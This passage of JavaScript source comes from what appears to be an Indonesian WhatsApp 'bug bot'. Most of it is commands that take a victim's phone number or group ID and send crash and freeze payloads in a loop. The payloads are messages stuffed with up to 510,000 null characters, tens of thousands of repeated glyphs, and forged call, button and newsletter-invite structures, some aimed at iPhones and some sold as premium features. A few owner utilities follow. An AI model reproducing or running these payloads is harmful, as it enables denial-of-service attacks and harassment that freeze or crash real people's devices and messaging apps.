									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "0@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": zLoc,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 Cella Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
			console.log(chalk.green("Cella Bot Attacked Someone!"));
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "DasarKontol" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await sych.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

 
		switch (command) {
		
		case 'tessss': {
    try {
        // Membuat pesan dengan tombol di WhatsApp
        const xp = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        buttons: [
                            {
                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                buttonText: { displayText: "InfoSC" },
                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                            }
                        ],
                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
    
${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB`,
                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                        text: "InfoSC"
                    }
                }
            }
        }, { ephemeralExpiration: 5, timestamp: new Date() });

        // Mengirim pesan dengan tombol
        const x1 = await sych.relayMessage(m.chat, xp.message, {
				'user': {
					'jid': m.chat
				}
				});

        // Menyiapkan pesan respons tombol
        const od = await sych.relayMessage(m.chat, {
            viewOnceMessage: {
                message: {
                    buttonsResponseMessage: {
                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
                        selectedDisplayText: "InfoSC",
                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
                        contextInfo: {
                            participant: m.chat,
                            remoteJid: m.chat,
                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
                            quotedMessage: {
                                viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        buttons: [
                            {
                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                buttonText: { displayText: "InfoSC" },
                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                            }
                        ],
                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
    
${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB`,
                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                        text: "InfoSc"
                    }
                }
            }
                            }
                        }
                    }
                }
            }
        },{ userJid: m.chat, quoted: m });

        // Mengirim balasan jika perintah valid
        await sych.sendMessage(m.chat, { text: "Proses" }, { quoted: m });

    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
}
break;

case 'hshsh': {
    try {
        // Membuat pesan dengan tombol di WhatsApp
        const xp = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        buttons: [
                            {
                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                buttonText: { displayText: "InfoSC" },
                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                            }
                        ],
                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
    
${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB`,
                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                        text: "InfoSC"
                    }
                }
            }
        }, { ephemeralExpiration: 5, timestamp: new Date() });

        // Mengirim pesan dengan tombol
        const x1 = await sych.relayMessage(m.chat, xp.message, {
				'user': {
					'jid': m.chat
				}
				});

        // Menyiapkan pesan respons tombol
        const od = await sych.relayMessage(m.chat, {
            viewOnceMessage: {
                message: {
                    buttonsResponseMessage: {
                        selectedButtonId: `${"\u0000".repeat(510000)}`, // Potensi crash uji coba
                        selectedDisplayText: "InfoSC",
                        type: proto.Message.ButtonsResponseMessage.Type.DISPLAY_TEXT,
                        contextInfo: {
                            participant: m.chat,
                            remoteJid: m.chat,
                            stanzaId: x1,  // Menggunakan ID pesan sebelumnya
                            quotedMessage: {
                                viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        buttons: [
                            {
                                buttonId: `${"\u0000".repeat(510000)}`,  // ID tombol (potensi crash uji coba)
                                buttonText: { displayText: "InfoSC" },
                                type: proto.Message.ButtonsMessage.Button.Type.RESPONSE
                            }
                        ],
                        contentText: `${ucapanWaktu} @${m.sender.split('@')[0]}
    
${f}*Name* : ${m.pushName ? m.pushName : 'Lu Siapa?'}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB`,
                        headerType: proto.Message.ButtonsMessage.HeaderType.TEXT,
                        text: "InfoSc"
                    }
                }
            }
                            }
                        }
                    }
                }
            }
        },{ userJid: m.chat, quoted: m });

        // Mengirim balasan jika perintah valid
        await sych.sendMessage(m.chat, { text: "Proses" }, { quoted: m });

    } catch (error) {
        console.error("Terjadi kesalahan:", error);
    }
}
break;

	
case 'bpgc': {
 
if (!q) return sycreply(`Example:\n ${prefix + command} ID GC`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.includes('@g.us') ? q : q.replace(/[^0-9]/g, '') + "@g.us";  
sych.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 
	
			
case 'kgc':  
    if (!q) return sycreply(`Masukkan ID Group\nContoh: ${prefix + command} Group_ID`);

    // Mengubah format target ke grup
    zLoc = q.includes('@g.us') ? q : q.replace(/[^0-9]/g, '') + "@g.us";  

    sycreply(`Proses Kirim Pesan ke Group ID: ${zLoc}  
    Please Wait...\n\n
    > © Galangxyz
    `, zLoc);  

    async function sendMessages() {
        for (let i = 0; i < 9; i++) {
            try {

                await langz(zLoc, ptcp = true);


                // Delay antar-pengiriman agar tidak overlimit
                await new Promise(resolve => setTimeout(resolve, 3000)); // 3 detik delay

            } catch (error) {
                console.error(`Gagal mengirim pesan ke ${zLoc}:`, error);
            }
        }
    }

    sendMessages().then(() => {
        sycreply(`Successfully Kirim Pesan ke Group: ${zLoc}\n\n> © Galangxyz`, zLoc);
    });

    console.log(`Target Group JID: ${zLoc}`);
    console.log(await sych.groupMetadata(zLoc));
    
    break;

// Case Bug ! //
case 'cellacrash': 

   
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
case 'byypas': 

 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: NewBug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await CallMsg(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: NewBug
 `)
 break
 case 'clearbugs': {
 
if (!q) return sycreply(`Example:\n ${prefix + command} 62xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
sych.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("Done Clear Bug ")
}
break 
 case 'cellafreeze': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: Freeze Bug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Freeze Bug
 `)
 break
 case '🔥': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 🔥
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await CaroUsel(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: ❤️‍🔥
 `)
 break
 case 'hardbug': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: hardbug
© Cella 
 `)
     for (let i = 0; i < 9; i++) {
    await XeonXRobust(zLoc, ptcp = true)
    await xeonHARD(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await newsLetter(zLoc, ptcp = true)   
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: hardbug
 `)
 break
 case '😈': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Lock Target: ${zLoc}
Requested Bug: 😈
© Cella 
 `)
     for (let i = 0; i < 10; i++) {
    await Gsz(zLoc, Ptcp = true)
    await xPokers(zLoc, Ptcp = true)
    await uidoc2(zLoc, ptcp = false)
    await freezefile(zLoc, ptcp = false)
    await CaroUsel(zLoc, ptcp = false)
    await NullX(zLoc, ptcp = false)
    await Vulcanicx(zLoc, ptcp = false)
    await xTravas(zLoc, ptcp = false)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 😈
 `)
 break
case '🦅': 

 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: 🦅
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: 🦅
 `)
 case 'killsystemui':
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
 case 'blankwhatsapp': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Blank System Ui
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await uidoc(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Blank System Ui
 `)
 break
case 'mediumbug':
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: mediumbug
 `)
     for (let i = 0; i < 5; i++) {
    await SletterCrash(zLoc, ptcp = true)
    await freezefile(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: mediumbug
 `)
 break
case 'combobug':

 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Bug Combo 
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
    await uidoc2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await TanggapanDiterima(zLoc, ptcp = true)
    await VPen(zLoc, ptcp = true)
    await BlankInvite(zLoc, ptcp = true)
    await liveLokFreeze(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Bug Combo
 `)
 break
 case 'iphonecrasher': 
 
 if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'lockios':
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: iPhone Bug
 `)
     for (let i = 0; i < 2; i++) {
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: iPhone Bug
 `)
 break
 case 'killaccess': 
 
if (!isPrem) return m.reply(` Khusus Premium Lol `)
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Kill iPhone Access
 `)
     for (let i = 0; i < 5; i++) {
    await IosPayM(zLoc, ptcp = true)
    await IosStanza(zLoc, ptcp = true)
    await IosCL(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Kill iPhone Access
 `)
 break
 case 'locationbug': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Location Bug
 `)
     for (let i = 0; i < 9; i++) {
    await liveLokFreeze(zLoc, ptcp = true)
    await locasiV2(zLoc, ptcp = true)
    await locasifreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Location Bug
 `)
 break
 case 'documentbug': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: Document Bug
 `)
     for (let i = 0; i < 9; i++) {
    await uidoc(zLoc, ptcp = true)
    await documentfreeze2(zLoc, ptcp = true)
    await documentfreeze(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: Document Bug
 `)
 break
case 'pairing': 
 
 
   if (!q) return sycreply(`Syntax Error\nUsage: ${prefix + command} 62x`)
zLoc = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(` Target: ${zLoc}
Requested Bug: pairing
 `)
     for (let i = 0; i < 9; i++) {
    await SendPairing(zLoc, ptcp = true)
     }
m.reply(` Successfully Sent Bugs To ${zLoc}
Bug Type: pairing
 `)
 break
 


			case '19rujxl1e': {
     
    console.log('.')
}
break;

// Owner Menu
case 'setbio': {
    if (!isCreator) return sycreply(mess.owner);
     
    if (!text) return sycreply('Mana text nya?');
    sych.setStatus(q);
    sycreply(`*Bio telah di ganti menjadi ${q}*`);
}
break;

case "addcmd":
case "setcmd": {
     
    if (isQuotedSticker) {
        if (!q) return sycreply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
        var kodenya = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString("base64");
        addCmd(kodenya, q);
        sycreply("Done!");
        await sych.sendMessage(m.chat, {
            react: {
                text: '🔐', // Emoji yang diinginkan
                key: m.key // Memberikan reaksi pada pesan perintah
            }
        });
    } else {
        sycreply("Tag stickenya");
    }
}
break;

case "delcmd": {
     
    if (!isQuotedSticker) return sycreply(`Penggunaan : ${command} tagsticker`);
    var kodenya = m.message.extendedTextMessage.contextInfo.quotedMessage.fileSha256.toString("base64");
    _scommand.splice(getCommandPosition(kodenya), 1);
    fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
    sycreply("Done!");
    await sych.sendMessage(m.chat, {
        react: {
            text: '🚫', // Emoji yang diinginkan
            key: m.key // Memberikan reaksi pada pesan perintah
        }
    });
}
break;

case "listcmd": {
     
    teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
    cemde = [];
    for (let i of _scommand) {
        cemde.push(i.id);
        teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
    }
    sycreply(teksnyee, cemde, true);
}
break;
case 'kee':{
sycreply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT ADA KENDALA/DEPOSIT BELOM DI KONFIRMASI BISA CHAT OWNER DI BAWAH.')
sych.sendMessage('50251731838@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n\n*@${sender.split('@')[0]}`, mentions: [sender]}, { quoted: fkontak })
        }
        break
//guide
case 'guide': {
    // Pesan guide singkat untuk pendaftaran
    let guideText = `❓ *Cara Pendaftaran Bot*\n\nSilakan pilih tombol pendaftaran di menu "daftar" dan nikmati fitur-fitur bot yang tersedia.`;

    // Kirim pesan guide
    sycreply(guideText);
}
break;

